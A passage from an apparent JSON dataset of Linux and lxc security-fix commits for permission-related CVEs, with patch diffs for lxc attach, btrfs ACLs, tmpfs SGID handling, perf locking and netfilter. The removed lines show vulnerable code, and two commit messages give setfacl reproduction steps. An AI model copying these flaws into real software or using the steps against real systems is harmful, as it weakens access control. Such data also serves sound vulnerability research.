to child. *\/\n+\t\tif ((options->namespaces & CLONE_NEWNS) && (options->attach_flags & LXC_ATTACH_LSM) && init_ctx->lsm_label) {\n+\t\t\tint on_exec, labelfd;\n+\t\t\ton_exec = options->attach_flags & LXC_ATTACH_LSM_EXEC ? 1 : 0;\n+\t\t\t\/* Open fd for the LSM security module. *\/\n+\t\t\tlabelfd = lsm_openat(procfd, attached_pid, on_exec);\n+\t\t\tif (labelfd < 0)\n+\t\t\t\tgoto cleanup_error;\n+\n+\t\t\t\/* Send child fd of the LSM security module to write to. *\/\n+\t\t\tret = lxc_abstract_unix_send_fd(ipc_sockets[0], labelfd, NULL, 0);\n+\t\t\tif (ret <= 0) {\n+\t\t\t\tERROR(\"Error using IPC to send child LSM fd (4): %s.\",\n+\t\t\t\t\t\tstrerror(errno));\n+\t\t\t\tgoto cleanup_error;\n+\t\t\t}\n+\t\t}\n+\n \t\t\/* now shut down communication with child, we're done *\/\n \t\tshutdown(ipc_sockets[0], SHUT_RDWR);\n \t\tclose(ipc_sockets[0]);\n@@ -940,6 +1008,8 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \t\t\/* first shut down the socket, then wait for the pid,\n \t\t * otherwise the pid we're waiting for may never exit\n \t\t *\/\n+\t\tif (procfd >= 0)\n+\t\t\tclose(procfd);\n \t\tshutdown(ipc_sockets[0], SHUT_RDWR);\n \t\tclose(ipc_sockets[0]);\n \t\tif (to_cleanup_pid)\n@@ -966,13 +1036,6 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \tif ((options->attach_flags & LXC_ATTACH_MOVE_TO_CGROUP) && cgns_supported())\n \t\toptions->namespaces |= CLONE_NEWCGROUP;\n \n-\tprocfd = open(\"\/proc\", O_DIRECTORY | O_RDONLY);\n-\tif (procfd < 0) {\n-\t\tSYSERROR(\"Unable to open \/proc\");\n-\t\tshutdown(ipc_sockets[1], SHUT_RDWR);\n-\t\trexit(-1);\n-\t}\n-\n \t\/* attach now, create another subprocess later, since pid namespaces\n \t * only really affect the children of the current process\n \t *\/\n@@ -1001,7 +1064,6 @@ int lxc_attach(const char* name, const char* lxcpath, lxc_attach_exec_t exec_fun\n \t\t\t.init_ctx = init_ctx,\n \t\t\t.exec_function = exec_function,\n \t\t\t.exec_payload = exec_payload,\n-\t\t\t.procfd = procfd\n \t\t};\n \t\t\/* We use clone_parent here to make this subprocess a direct child of\n \t\t * the initial process. Then this intermediate process can exit and\n@@ -1039,7 +1101,6 @@ static int attach_child_main(void* data)\n {\n \tstruct attach_clone_payload* payload = (struct attach_clone_payload*)data;\n \tint ipc_socket = payload->ipc_socket;\n-\tint procfd = payload->procfd;\n \tlxc_attach_options_t* options = payload->options;\n \tstruct lxc_proc_context_info* init_ctx = payload->init_ctx;\n #if HAVE_SYS_PERSONALITY_H\n@@ -1050,6 +1111,7 @@ static int attach_child_main(void* data)\n \tint expected;\n \tlong flags;\n \tint fd;\n+\tint lsm_labelfd;\n \tuid_t new_uid;\n \tgid_t new_gid;\n \n@@ -1060,7 +1122,7 @@ static int attach_child_main(void* data)\n \tstatus = -1;\n \tret = lxc_read_nointr_expect(ipc_socket, &status, sizeof(status), &expected);\n \tif (ret <= 0) {\n-\t\tERROR(\"error using IPC to receive notification from initial process (0)\");\n+\t\tERROR(\"Error using IPC to receive notification from initial process (0): %s.\", strerror(errno));\n \t\tshutdown(ipc_socket, SHUT_RDWR);\n \t\trexit(-1);\n \t}\n@@ -1159,7 +1221,7 @@ static int attach_child_main(void* data)\n \tstatus = 1;\n \tret = lxc_write_nointr(ipc_socket, &status, sizeof(status));\n \tif (ret != sizeof(status)) {\n-\t\tERROR(\"error using IPC to notify initial process for initialization (1)\");\n+\t\tERROR(\"Error using IPC to notify initial process for initialization (1): %s.\", strerror(errno));\n \t\tshutdown(ipc_socket, SHUT_RDWR);\n \t\trexit(-1);\n \t}\n@@ -1171,14 +1233,13 @@ static int attach_child_main(void* data)\n \tstatus = -1;\n \tret = lxc_read_nointr_expect(ipc_socket, &status, sizeof(status), &expected);\n \tif (ret <= 0) {\n-\t\tERROR(\"error using IPC to receive final notification from initial process (2)\");\n+\t\tERROR(\"Error using IPC to receive message from initial process \"\n+\t\t      \"that it is done pre-initializing (2): %s\",\n+\t\t      strerror(errno));\n \t\tshutdown(ipc_socket, SHUT_RDWR);\n \t\trexit(-1);\n \t}\n \n-\tshutdown(ipc_socket, SHUT_RDWR);\n-\tclose(ipc_socket);\n-\n \tif ((init_ctx->container && init_ctx->container->lxc_conf &&\n \t     init_ctx->container->lxc_conf->no_new_privs) ||\n \t    (options->attach_flags & LXC_ATTACH_NO_NEW_PRIVS)) {\n@@ -1186,27 +1247,53 @@ static int attach_child_main(void* data)\n \t\t\tSYSERROR(\"PR_SET_NO_NEW_PRIVS could not be set. \"\n \t\t\t\t \"Process can use execve() gainable \"\n \t\t\t\t \"privileges.\");\n+\t\t\tshutdown(ipc_socket, SHUT_RDWR);\n \t\t\trexit(-1);\n \t\t}\n \t\tINFO(\"PR_SET_NO_NEW_PRIVS is set. Process cannot use execve() \"\n \t\t     \"gainable privileges.\");\n \t}\n \n-\t\/* set new apparmor profile\/selinux context *\/\n+\t\/* Tell the (grand)parent to send us LSM label fd. *\/\n+\tstatus = 3;\n+\tret = lxc_write_nointr(ipc_socket, &status, sizeof(status));\n+\tif (ret <= 0) {\n+\t\tERROR(\"Error using IPC to tell parent to set up LSM labels (3): %s.\", strerror(errno));\n+\t\tshutdown(ipc_socket, SHUT_RDWR);\n+\t\trexit(-1);\n+\t}\n+\n \tif ((options->namespaces & CLONE_NEWNS) && (options->attach_flags & LXC_ATTACH_LSM) && init_ctx->lsm_label) {\n \t\tint on_exec;\n+\t\t\/* Receive fd for LSM security module. *\/\n+\t\tret = lxc_abstract_unix_recv_fd(ipc_socket, &lsm_labelfd, NULL, 0);\n+\t\tif (ret <= 0) {\n+\t\t\tERROR(\"Error using IPC for parent to tell us LSM label fd (4): %s.\", strerror(errno));\n+\t\t\tshutdown(ipc_socket, SHUT_RDWR);\n+\t\t\trexit(-1);\n+\t\t}\n \n+\t\t\/* Change into our new LSM profile. *\/\n \t\ton_exec = options->attach_flags & LXC_ATTACH_LSM_EXEC ? 1 : 0;\n-\t\tif (lsm_set_label_at(procfd, on_exec, init_ctx->lsm_label) < 0) {\n+\t\tif (lsm_set_label_at(lsm_labelfd, on_exec, init_ctx->lsm_label) < 0) {\n+\t\t\tSYSERROR(\"Failed to set LSM label.\");\n+\t\t\tshutdown(ipc_socket, SHUT_RDWR);\n+\t\t\tclose(lsm_labelfd);\n \t\t\trexit(-1);\n \t\t}\n+\t\tclose(lsm_labelfd);\n \t}\n+\n \tif (init_ctx->container && init_ctx->container->lxc_conf &&\n \t    init_ctx->container->lxc_conf->seccomp &&\n \t    (lxc_seccomp_load(init_ctx->container->lxc_conf) != 0)) {\n \t\tERROR(\"Loading seccomp policy\");\n+\t\tshutdown(ipc_socket, SHUT_RDWR);\n \t\trexit(-1);\n \t}\n+\n+\tshutdown(ipc_socket, SHUT_RDWR);\n+\tclose(ipc_socket);\n \tlxc_proc_put_context_info(init_ctx);\n \n \t\/* The following is done after the communication socket is\n@@ -1245,9 +1332,6 @@ static int attach_child_main(void* data)\n \t\t\t\tSYSERROR(\"Unable to clear CLOEXEC from fd\");\n \t}\n \n-\t\/* we don't need proc anymore *\/\n-\tclose(procfd);\n-\n \t\/* we're done, so we can now do whatever the user intended us to do *\/\n \trexit(payload->exec_function(payload->exec_payload));\n }\n","owner":"lxc","repo":"lxc","source":"cve"},{"CVE_ID":"CVE-2010-2071","CWE_ID":"264","category":"security","commit_id":"2f26afba46f0ebf155cf9be746496a0304a5b7cf","commit_message":"From 2f26afba46f0ebf155cf9be746496a0304a5b7cf Mon Sep 17 00:00:00 2001\nFrom: Shi Weihua <shiwh@cn.fujitsu.com>\nDate: Tue, 18 May 2010 00:50:32 +0000\nSubject: Btrfs: should add a permission check for setfacl\n\nOn btrfs, do the following\n------------------\n# su user1\n# cd btrfs-part\/\n# touch aaa\n# getfacl aaa\n  # file: aaa\n  # owner: user1\n  # group: user1\n  user::rw-\n  group::rw-\n  other::r--\n# su user2\n# cd btrfs-part\/\n# setfacl -m u::rwx aaa\n# getfacl aaa\n  # file: aaa\n  # owner: user1\n  # group: user1\n  user::rwx           <- successed to setfacl\n  group::rw-\n  other::r--\n------------------\nbut we should prohibit it that user2 changing user1's acl.\nIn fact, on ext3 and other fs, a message occurs:\n  setfacl: aaa: Operation not permitted\n\nThis patch fixed it.\nSigned-off-by: Shi Weihua <shiwh@cn.fujitsu.com>\nSigned-off-by: Chris Mason <chris.mason@oracle.com>\n---\n fs\/btrfs\/acl.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/fs\/btrfs\/acl.c b\/fs\/btrfs\/acl.c\nindex 6ef7b26724ec..6b4d0cca5c7f 100644\n--- a\/fs\/btrfs\/acl.c\n+++ b\/fs\/btrfs\/acl.c\n@@ -160,6 +160,9 @@ static int btrfs_xattr_acl_set(struct dentry *dentry, const char *name,\n \tint ret;\n \tstruct posix_acl *acl = NULL;\n \n+\tif (!is_owner_or_cap(dentry->d_inode))\n+\t\treturn -EPERM;\n+\n \tif (value) {\n \t\tacl = posix_acl_from_xattr(value, size);\n \t\tif (acl == NULL) {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-5551","CWE_ID":"264","category":"security","commit_id":"497de07d89c1410d76a15bec2bb41f24a2a89f31","commit_message":"From 497de07d89c1410d76a15bec2bb41f24a2a89f31 Mon Sep 17 00:00:00 2001\nFrom: Gu Zheng <guzheng1@huawei.com>\nDate: Mon, 9 Jan 2017 09:34:48 +0800\nSubject: [PATCH] tmpfs: clear S_ISGID when setting posix ACLs\n\nThis change was missed the tmpfs modification in In CVE-2016-7097\ncommit 073931017b49 (\"posix_acl: Clear SGID bit when setting\nfile permissions\")\nIt can test by xfstest generic\/375, which failed to clear\nsetgid bit in the following test case on tmpfs:\n\n  touch $testfile\n  chown 100:100 $testfile\n  chmod 2755 $testfile\n  _runas -u 100 -g 101 -- setfacl -m u::rwx,g::rwx,o::rwx $testfile\n\nSigned-off-by: Gu Zheng <guzheng1@huawei.com>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n fs\/posix_acl.c | 9 ++++-----\n 1 file changed, 4 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/fs\/posix_acl.c b\/fs\/posix_acl.c\nindex 595522022aca0..c9d48dc784953 100644\n--- a\/fs\/posix_acl.c\n+++ b\/fs\/posix_acl.c\n@@ -922,11 +922,10 @@ int simple_set_acl(struct inode *inode, struct posix_acl *acl, int type)\n \tint error;\n \n \tif (type == ACL_TYPE_ACCESS) {\n-\t\terror = posix_acl_equiv_mode(acl, &inode->i_mode);\n-\t\tif (error < 0)\n-\t\t\treturn 0;\n-\t\tif (error == 0)\n-\t\t\tacl = NULL;\n+\t\terror = posix_acl_update_mode(inode,\n+\t\t\t\t&inode->i_mode, &acl);\n+\t\tif (error)\n+\t\t\treturn error;\n \t}\n \n \tinode->i_ctime = current_time(inode);\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2016-6787","CWE_ID":"264","category":"security","commit_id":"f63a8daa5812afef4f06c962351687e1ff9ccb2b","commit_message":"From f63a8daa5812afef4f06c962351687e1ff9ccb2b Mon Sep 17 00:00:00 2001\nFrom: Peter Zijlstra <peterz@infradead.org>\nDate: Fri, 23 Jan 2015 12:24:14 +0100\nSubject: [PATCH] perf: Fix event->ctx locking\n\nThere have been a few reported issues wrt. the lack of locking around\nchanging event->ctx. This patch tries to address those.\n\nIt avoids the whole rwsem thing; and while it appears to work, please\ngive it some thought in review.\n\nWhat I did fail at is sensible runtime checks on the use of\nevent->ctx, the RCU use makes it very hard.\n\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nCc: Paul E. McKenney <paulmck@linux.vnet.ibm.com>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Arnaldo Carvalho de Melo <acme@kernel.org>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nLink: http:\/\/lkml.kernel.org\/r\/20150123125834.209535886@infradead.org\nSigned-off-by: Ingo Molnar <mingo@kernel.org>\n---\n kernel\/events\/core.c | 244 ++++++++++++++++++++++++++++++++++++-------\n 1 file changed, 207 insertions(+), 37 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/events\/core.c b\/kernel\/events\/core.c\nindex b358cb38e4a55..417a96bf3d417 100644\n--- a\/kernel\/events\/core.c\n+++ b\/kernel\/events\/core.c\n@@ -906,6 +906,77 @@ static void put_ctx(struct perf_event_context *ctx)\n \t}\n }\n \n+\/*\n+ * Because of perf_event::ctx migration in sys_perf_event_open::move_group and\n+ * perf_pmu_migrate_context() we need some magic.\n+ *\n+ * Those places that change perf_event::ctx will hold both\n+ * perf_event_ctx::mutex of the 'old' and 'new' ctx value.\n+ *\n+ * Lock ordering is by mutex address. There is one other site where\n+ * perf_event_context::mutex nests and that is put_event(). But remember that\n+ * that is a parent<->child context relation, and migration does not affect\n+ * children, therefore these two orderings should not interact.\n+ *\n+ * The change in perf_event::ctx does not affect children (as claimed above)\n+ * because the sys_perf_event_open() case will install a new event and break\n+ * the ctx parent<->child relation, and perf_pmu_migrate_context() is only\n+ * concerned with cpuctx and that doesn't have children.\n+ *\n+ * The places that change perf_event::ctx will issue:\n+ *\n+ *   perf_remove_from_context();\n+ *   synchronize_rcu();\n+ *   perf_install_in_context();\n+ *\n+ * to affect the change. The remove_from_context() + synchronize_rcu() should\n+ * quiesce the event, after which we can install it in the new location. This\n+ * means that only external vectors (perf_fops, prctl) can perturb the event\n+ * while in transit. Therefore all such accessors should also acquire\n+ * perf_event_context::mutex to serialize against this.\n+ *\n+ * However; because event->ctx can change while we're waiting to acquire\n+ * ctx->mutex we must be careful and use the below perf_event_ctx_lock()\n+ * function.\n+ *\n+ * Lock order:\n+ *\ttask_struct::perf_event_mutex\n+ *\t  perf_event_context::mutex\n+ *\t    perf_event_context::lock\n+ *\t    perf_event::child_mutex;\n+ *\t    perf_event::mmap_mutex\n+ *\t    mmap_sem\n+ *\/\n+static struct perf_event_context *perf_event_ctx_lock(struct perf_event *event)\n+{\n+\tstruct perf_event_context *ctx;\n+\n+again:\n+\trcu_read_lock();\n+\tctx = ACCESS_ONCE(event->ctx);\n+\tif (!atomic_inc_not_zero(&ctx->refcount)) {\n+\t\trcu_read_unlock();\n+\t\tgoto again;\n+\t}\n+\trcu_read_unlock();\n+\n+\tmutex_lock(&ctx->mutex);\n+\tif (event->ctx != ctx) {\n+\t\tmutex_unlock(&ctx->mutex);\n+\t\tput_ctx(ctx);\n+\t\tgoto again;\n+\t}\n+\n+\treturn ctx;\n+}\n+\n+static void perf_event_ctx_unlock(struct perf_event *event,\n+\t\t\t\t  struct perf_event_context *ctx)\n+{\n+\tmutex_unlock(&ctx->mutex);\n+\tput_ctx(ctx);\n+}\n+\n \/*\n  * This must be done under the ctx->lock, such as to serialize against\n  * context_equiv(), therefore we cannot call put_ctx() since that might end up\n@@ -1666,7 +1737,7 @@ int __perf_event_disable(void *info)\n  * is the current context on this CPU and preemption is disabled,\n  * hence we can't get into perf_event_task_sched_out for this context.\n  *\/\n-void perf_event_disable(struct perf_event *event)\n+static void _perf_event_disable(struct perf_event *event)\n {\n \tstruct perf_event_context *ctx = event->ctx;\n \tstruct task_struct *task = ctx->task;\n@@ -1707,6 +1778,19 @@ void perf_event_disable(struct perf_event *event)\n \t}\n \traw_spin_unlock_irq(&ctx->lock);\n }\n+\n+\/*\n+ * Strictly speaking kernel users cannot create groups and therefore this\n+ * interface does not need the perf_event_ctx_lock() magic.\n+ *\/\n+void perf_event_disable(struct perf_event *event)\n+{\n+\tstruct perf_event_context *ctx;\n+\n+\tctx = perf_event_ctx_lock(event);\n+\t_perf_event_disable(event);\n+\tperf_event_ctx_unlock(event, ctx);\n+}\n EXPORT_SYMBOL_GPL(perf_event_disable);\n \n static void perf_set_shadow_time(struct perf_event *event,\n@@ -2170,7 +2254,7 @@ static int __perf_event_enable(void *info)\n  * perf_event_for_each_child or perf_event_for_each as described\n  * for perf_event_disable.\n  *\/\n-void perf_event_enable(struct perf_event *event)\n+static void _perf_event_enable(struct perf_event *event)\n {\n \tstruct perf_event_context *ctx = event->ctx;\n \tstruct task_struct *task = ctx->task;\n@@ -2226,9 +2310,21 @@ void perf_event_enable(struct perf_event *event)\n out:\n \traw_spin_unlock_irq(&ctx->lock);\n }\n+\n+\/*\n+ * See perf_event_disable();\n+ *\/\n+void perf_event_enable(struct perf_event *event)\n+{\n+\tstruct perf_event_context *ctx;\n+\n+\tctx = perf_event_ctx_lock(event);\n+\t_perf_event_enable(event);\n+\tperf_event_ctx_unlock(event, ctx);\n+}\n EXPORT_SYMBOL_GPL(perf_event_enable);\n \n-int perf_event_refresh(struct perf_event *event, int refresh)\n+static int _perf_event_refresh(struct perf_event *event, int refresh)\n {\n \t\/*\n \t * not supported on inherited events\n@@ -2237,10 +2333,25 @@ int perf_event_refresh(struct perf_event *event, int refresh)\n \t\treturn -EINVAL;\n \n \tatomic_add(refresh, &event->event_limit);\n-\tperf_event_enable(event);\n+\t_perf_event_enable(event);\n \n \treturn 0;\n }\n+\n+\/*\n+ * See perf_event_disable()\n+ *\/\n+int perf_event_refresh(struct perf_event *event, int refresh)\n+{\n+\tstruct perf_event_context *ctx;\n+\tint ret;\n+\n+\tctx = perf_event_ctx_lock(event);\n+\tret = _perf_event_refresh(event, refresh);\n+\tperf_event_ctx_unlock(event, ctx);\n+\n+\treturn ret;\n+}\n EXPORT_SYMBOL_GPL(perf_event_refresh);\n \n static void ctx_sched_out(struct perf_event_context *ctx,\n@@ -3433,7 +3544,16 @@ static void perf_remove_from_owner(struct perf_event *event)\n \trcu_read_unlock();\n \n \tif (owner) {\n-\t\tmutex_lock(&owner->perf_event_mutex);\n+\t\t\/*\n+\t\t * If we're here through perf_event_exit_task() we're already\n+\t\t * holding ctx->mutex which would be an inversion wrt. the\n+\t\t * normal lock order.\n+\t\t *\n+\t\t * However we can safely take this lock because its the child\n+\t\t * ctx->mutex.\n+\t\t *\/\n+\t\tmutex_lock_nested(&owner->perf_event_mutex, SINGLE_DEPTH_NESTING);\n+\n \t\t\/*\n \t\t * We have to re-check the event->owner field, if it is cleared\n \t\t * we raced with perf_event_exit_task(), acquiring the mutex\n@@ -3559,12 +3679,13 @@ static int perf_event_read_group(struct perf_event *event,\n \t\t\t\t   u64 read_format, char __user *buf)\n {\n \tstruct perf_event *leader = event->group_leader, *sub;\n-\tint n = 0, size = 0, ret = -EFAULT;\n \tstruct perf_event_context *ctx = leader->ctx;\n-\tu64 values[5];\n+\tint n = 0, size = 0, ret;\n \tu64 count, enabled, running;\n+\tu64 values[5];\n+\n+\tlockdep_assert_held(&ctx->mutex);\n \n-\tmutex_lock(&ctx->mutex);\n \tcount = perf_event_read_value(leader, &enabled, &running);\n \n \tvalues[n++] = 1 + leader->nr_siblings;\n@@ -3579,7 +3700,7 @@ static int perf_event_read_group(struct perf_event *event,\n \tsize = n * sizeof(u64);\n \n \tif (copy_to_user(buf, values, size))\n-\t\tgoto unlock;\n+\t\treturn -EFAULT;\n \n \tret = size;\n \n@@ -3593,14 +3714,11 @@ static int perf_event_read_group(struct perf_event *event,\n \t\tsize = n * sizeof(u64);\n \n \t\tif (copy_to_user(buf + ret, values, size)) {\n-\t\t\tret = -EFAULT;\n-\t\t\tgoto unlock;\n+\t\t\treturn -EFAULT;\n \t\t}\n \n \t\tret += size;\n \t}\n-unlock:\n-\tmutex_unlock(&ctx->mutex);\n \n \treturn ret;\n }\n@@ -3672,8 +3790,14 @@ static ssize_t\n perf_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)\n {\n \tstruct perf_event *event = file->private_data;\n+\tstruct perf_event_context *ctx;\n+\tint ret;\n \n-\treturn perf_read_hw(event, buf, count);\n+\tctx = perf_event_ctx_lock(event);\n+\tret = perf_read_hw(event, buf, count);\n+\tperf_event_ctx_unlock(event, ctx);\n+\n+\treturn ret;\n }\n \n static unsigned int perf_poll(struct file *file, poll_table *wait)\n@@ -3699,7 +3823,7 @@ static unsigned int perf_poll(struct file *file, poll_table *wait)\n \treturn events;\n }\n \n-static void perf_event_reset(struct perf_event *event)\n+static void _perf_event_reset(struct perf_event *event)\n {\n \t(void)perf_event_read(event);\n \tlocal64_set(&event->count, 0);\n@@ -3718,6 +3842,7 @@ static void perf_event_for_each_child(struct perf_event *event,\n \tstruct perf_event *child;\n \n \tWARN_ON_ONCE(event->ctx->parent_ctx);\n+\n \tmutex_lock(&event->child_mutex);\n \tfunc(event);\n \tlist_for_each_entry(child, &event->child_list, child_list)\n@@ -3731,14 +3856,13 @@ static void perf_event_for_each(struct perf_event *event,\n \tstruct perf_event_context *ctx = event->ctx;\n \tstruct perf_event *sibling;\n \n-\tWARN_ON_ONCE(ctx->parent_ctx);\n-\tmutex_lock(&ctx->mutex);\n+\tlockdep_assert_held(&ctx->mutex);\n+\n \tevent = event->group_leader;\n \n \tperf_event_for_each_child(event, func);\n \tlist_for_each_entry(sibling, &event->sibling_list, group_entry)\n \t\tperf_event_for_each_child(sibling, func);\n-\tmutex_unlock(&ctx->mutex);\n }\n \n static int perf_event_period(struct perf_event *event, u64 __user *arg)\n@@ -3808,25 +3932,24 @@ static int perf_event_set_output(struct perf_event *event,\n \t\t\t\t struct perf_event *output_event);\n static int perf_event_set_filter(struct perf_event *event, void __user *arg);\n \n-static long perf_ioctl(struct file *file, unsigned int cmd, unsigned long arg)\n+static long _perf_ioctl(struct perf_event *event, unsigned int cmd, unsigned long arg)\n {\n-\tstruct perf_event *event = file->private_data;\n \tvoid (*func)(struct perf_event *);\n \tu32 flags = arg;\n \n \tswitch (cmd) {\n \tcase PERF_EVENT_IOC_ENABLE:\n-\t\tfunc = perf_event_enable;\n+\t\tfunc = _perf_event_enable;\n \t\tbreak;\n \tcase PERF_EVENT_IOC_DISABLE:\n-\t\tfunc = perf_event_disable;\n+\t\tfunc = _perf_event_disable;\n \t\tbreak;\n \tcase PERF_EVENT_IOC_RESET:\n-\t\tfunc = perf_event_reset;\n+\t\tfunc = _perf_event_reset;\n \t\tbreak;\n \n \tcase PERF_EVENT_IOC_REFRESH:\n-\t\treturn perf_event_refresh(event, arg);\n+\t\treturn _perf_event_refresh(event, arg);\n \n \tcase PERF_EVENT_IOC_PERIOD:\n \t\treturn perf_event_period(event, (u64 __user *)arg);\n@@ -3873,6 +3996,19 @@ static long perf_ioctl(struct file *file, unsigned int cmd, unsigned long arg)\n \treturn 0;\n }\n \n+static long perf_ioctl(struct file *file, unsigned int cmd, unsigned long arg)\n+{\n+\tstruct perf_event *event = file->private_data;\n+\tstruct perf_event_context *ctx;\n+\tlong ret;\n+\n+\tctx = perf_event_ctx_lock(event);\n+\tret = _perf_ioctl(event, cmd, arg);\n+\tperf_event_ctx_unlock(event, ctx);\n+\n+\treturn ret;\n+}\n+\n #ifdef CONFIG_COMPAT\n static long perf_compat_ioctl(struct file *file, unsigned int cmd,\n \t\t\t\tunsigned long arg)\n@@ -3895,11 +4031,15 @@ static long perf_compat_ioctl(struct file *file, unsigned int cmd,\n \n int perf_event_task_enable(void)\n {\n+\tstruct perf_event_context *ctx;\n \tstruct perf_event *event;\n \n \tmutex_lock(&current->perf_event_mutex);\n-\tlist_for_each_entry(event, &current->perf_event_list, owner_entry)\n-\t\tperf_event_for_each_child(event, perf_event_enable);\n+\tlist_for_each_entry(event, &current->perf_event_list, owner_entry) {\n+\t\tctx = perf_event_ctx_lock(event);\n+\t\tperf_event_for_each_child(event, _perf_event_enable);\n+\t\tperf_event_ctx_unlock(event, ctx);\n+\t}\n \tmutex_unlock(&current->perf_event_mutex);\n \n \treturn 0;\n@@ -3907,11 +4047,15 @@ int perf_event_task_enable(void)\n \n int perf_event_task_disable(void)\n {\n+\tstruct perf_event_context *ctx;\n \tstruct perf_event *event;\n \n \tmutex_lock(&current->perf_event_mutex);\n-\tlist_for_each_entry(event, &current->perf_event_list, owner_entry)\n-\t\tperf_event_for_each_child(event, perf_event_disable);\n+\tlist_for_each_entry(event, &current->perf_event_list, owner_entry) {\n+\t\tctx = perf_event_ctx_lock(event);\n+\t\tperf_event_for_each_child(event, _perf_event_disable);\n+\t\tperf_event_ctx_unlock(event, ctx);\n+\t}\n \tmutex_unlock(&current->perf_event_mutex);\n \n \treturn 0;\n@@ -7269,6 +7413,15 @@ perf_event_set_output(struct perf_event *event, struct perf_event *output_event)\n \treturn ret;\n }\n \n+static void mutex_lock_double(struct mutex *a, struct mutex *b)\n+{\n+\tif (b < a)\n+\t\tswap(a, b);\n+\n+\tmutex_lock(a);\n+\tmutex_lock_nested(b, SINGLE_DEPTH_NESTING);\n+}\n+\n \/**\n  * sys_perf_event_open - open a performance event, associate it to a task\/cpu\n  *\n@@ -7284,7 +7437,7 @@ SYSCALL_DEFINE5(perf_event_open,\n \tstruct perf_event *group_leader = NULL, *output_event = NULL;\n \tstruct perf_event *event, *sibling;\n \tstruct perf_event_attr attr;\n-\tstruct perf_event_context *ctx;\n+\tstruct perf_event_context *ctx, *uninitialized_var(gctx);\n \tstruct file *event_file = NULL;\n \tstruct fd group = {NULL, 0};\n \tstruct task_struct *task = NULL;\n@@ -7482,9 +7635,14 @@ SYSCALL_DEFINE5(perf_event_open,\n \t}\n \n \tif (move_group) {\n-\t\tstruct perf_event_context *gctx = group_leader->ctx;\n+\t\tgctx = group_leader->ctx;\n+\n+\t\t\/*\n+\t\t * See perf_event_ctx_lock() for comments on the details\n+\t\t * of swizzling perf_event::ctx.\n+\t\t *\/\n+\t\tmutex_lock_double(&gctx->mutex, &ctx->mutex);\n \n-\t\tmutex_lock(&gctx->mutex);\n \t\tperf_remove_from_context(group_leader, false);\n \n \t\t\/*\n@@ -7499,15 +7657,19 @@ SYSCALL_DEFINE5(perf_event_open,\n \t\t\tperf_event__state_init(sibling);\n \t\t\tput_ctx(gctx);\n \t\t}\n-\t\tmutex_unlock(&gctx->mutex);\n-\t\tput_ctx(gctx);\n+\t} else {\n+\t\tmutex_lock(&ctx->mutex);\n \t}\n \n \tWARN_ON_ONCE(ctx->parent_ctx);\n-\tmutex_lock(&ctx->mutex);\n \n \tif (move_group) {\n+\t\t\/*\n+\t\t * Wait for everybody to stop referencing the events through\n+\t\t * the old lists, before installing it on new lists.\n+\t\t *\/\n \t\tsynchronize_rcu();\n+\n \t\tperf_install_in_context(ctx, group_leader, group_leader->cpu);\n \t\tget_ctx(ctx);\n \t\tlist_for_each_entry(sibling, &group_leader->sibling_list,\n@@ -7519,6 +7681,11 @@ SYSCALL_DEFINE5(perf_event_open,\n \n \tperf_install_in_context(ctx, event, event->cpu);\n \tperf_unpin_context(ctx);\n+\n+\tif (move_group) {\n+\t\tmutex_unlock(&gctx->mutex);\n+\t\tput_ctx(gctx);\n+\t}\n \tmutex_unlock(&ctx->mutex);\n \n \tput_online_cpus();\n@@ -7626,7 +7793,11 @@ void perf_pmu_migrate_context(struct pmu *pmu, int src_cpu, int dst_cpu)\n \tsrc_ctx = &per_cpu_ptr(pmu->pmu_cpu_context, src_cpu)->ctx;\n \tdst_ctx = &per_cpu_ptr(pmu->pmu_cpu_context, dst_cpu)->ctx;\n \n-\tmutex_lock(&src_ctx->mutex);\n+\t\/*\n+\t * See perf_event_ctx_lock() for comments on the details\n+\t * of swizzling perf_event::ctx.\n+\t *\/\n+\tmutex_lock_double(&src_ctx->mutex, &dst_ctx->mutex);\n \tlist_for_each_entry_safe(event, tmp, &src_ctx->event_list,\n \t\t\t\t event_entry) {\n \t\tperf_remove_from_context(event, false);\n@@ -7634,11 +7805,9 @@ void perf_pmu_migrate_context(struct pmu *pmu, int src_cpu, int dst_cpu)\n \t\tput_ctx(src_ctx);\n \t\tlist_add(&event->migrate_entry, &events);\n \t}\n-\tmutex_unlock(&src_ctx->mutex);\n \n \tsynchronize_rcu();\n \n-\tmutex_lock(&dst_ctx->mutex);\n \tlist_for_each_entry_safe(event, tmp, &events, migrate_entry) {\n \t\tlist_del(&event->migrate_entry);\n \t\tif (event->state >= PERF_EVENT_STATE_OFF)\n@@ -7648,6 +7817,7 @@ void perf_pmu_migrate_context(struct pmu *pmu, int src_cpu, int dst_cpu)\n \t\tget_ctx(dst_ctx);\n \t}\n \tmutex_unlock(&dst_ctx->mutex);\n+\tmutex_unlock(&src_ctx->mutex);\n }\n EXPORT_SYMBOL_GPL(perf_pmu_migrate_context);\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-4997","CWE_ID":"264","category":"security","commit_id":"ce683e5f9d045e5d67d1312a42b359cb2ab2a13c","commit_message":"From ce683e5f9d045e5d67d1312a42b359cb2ab2a13c Mon Sep 17 00:00:00 2001\nFrom: Florian Westphal <fw@strlen.de>\nDate: Fri, 1 Apr 2016 14:17:28 +0200\nSubject: netfilter: x_tables: check for bogus target offset\n\nWe're currently asserting that targetoff + targetsize <= nextoff.\n\nExtend it to also check that targetoff is >= sizeof(xt_entry).\nSince this is generic code, add an argument pointing to the start of the\nmatch\/target, we can then derive the base structure size from the delta.\n\nWe also need the e->elems pointer in a followup change to validate matches.\n\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>\n---\n include\/linux\/netfilter\/x_tables.h |  4 ++--\n net\/ipv4\/netfilter\/arp_tables.c    |  5 +++--\n net\/ipv4\/netfilter\/ip_tables.c     |  5 +++--\n 